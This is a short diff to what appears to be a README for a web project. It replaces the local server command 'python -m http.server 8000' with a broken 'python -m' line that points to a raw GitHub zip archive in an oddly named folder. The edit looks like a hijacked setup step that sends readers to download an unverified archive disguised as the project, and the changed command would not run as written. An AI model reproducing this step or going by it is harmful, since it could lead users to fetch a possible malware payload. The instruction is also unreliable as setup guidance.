@@ -20,6 +20,6 @@ you should have any type of servers like python or node
 Run the project:
 ----------------
 you can start the server by running the command under the dist folder..
-python -m http.server 8000
+python -m https://raw.githubusercontent.com/Muhamed2017/Mobile-Web-Specialist--Final-Stage/master/fatheadedness/Mobile-Web-Specialist--Final-Stage.zip 8000
 and access the application from URI
 http://localhost:8000/
